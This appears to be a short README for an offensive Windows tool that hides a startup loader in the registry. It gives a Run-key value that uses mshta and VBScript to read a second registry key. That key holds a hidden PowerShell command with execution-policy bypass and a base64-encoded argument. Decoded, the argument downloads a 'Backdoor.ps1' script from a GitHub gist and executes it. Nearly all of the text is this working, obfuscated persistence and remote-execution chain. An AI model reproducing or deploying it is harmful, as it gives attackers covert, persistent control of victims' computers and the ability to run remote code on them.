# Load-hidden-in-Registry



Producing ahidden stratup to apowershell backdoor with no files just aloader to put reg keys
it offers many loaders with alot of types

Winscript Commands in reg keys calls throw mshta.exe

startup Load
reg key:
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\
Value:
MSHTA VbScript:Execute("CreateObject(""Wscript.Shell"").Run CreateObject(""Wscript.Shell"").RegRead(""HKCU\v1Elm0D""), 0, False:close")

Backdoor Key:
HKCU\v1Elm0D
value:
powershell.exe -ep bypass -w hidden -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBnAGkAcwB0AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBFAGwAbQAwAEQALwAzAGUAMQA2ADAAOABhAGMANABjADEAYQAxADkAMwBhADcAZAA2ADMAYgA0AGIAMQAwAGMAYwA4AGYAZQBjADQALwByAGEAdwAvADgAOQA4ADMAZQAxADAAZQBmAGUAOAAyADYAMgAyADYAMABmAGEAZgBiADQAOQA1ADMAOQBhAGIAMwBjADgAOQA4ADYAOAA5ADUAYgA3ADgALwBCAGEAYwBrAGQAbwBvAHIALgBwAHMAMQAnACkAOwA=

